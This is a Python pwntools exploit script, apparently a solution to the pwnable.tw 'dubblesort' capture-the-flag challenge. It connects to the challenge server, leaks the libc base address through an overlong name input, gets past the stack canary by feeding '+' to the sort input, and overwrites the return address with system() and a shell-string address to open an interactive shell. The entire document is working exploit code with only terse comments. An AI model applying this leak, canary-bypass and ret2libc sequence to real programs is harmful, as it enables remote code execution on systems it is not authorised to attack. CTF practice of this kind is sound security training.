from pwn import *

#r = process('./dubblesort')#, env={'LD_PRELOAD':'./libc_32.so.6'})
e = ELF('./libc_32.so.6')
r = remote('chall.pwnable.tw', 10101)
r.sendafter('name :', b'a'*28)
offset = 0x1ae244

# Leak libc base
r.recvuntil(b'a'*28)
libc = u32(r.recv(4)) - offset
success('libc base = %s' % hex(libc))

system = libc + e.symbols['system']
sh = libc + 0x158e8b

# Bypass Canary
r.sendlineafter('what to sort :', str(35))
for i in range(24):
    r.sendlineafter(':', str(i))
r.sendlineafter(':', '+')

# Overwrite return address
for i in range(7):
    r.sendlineafter(':', str(libc))
r.sendlineafter(':', str(system))
for i in range(2):
    r.sendlineafter(':', str(sh))
r.interactive()
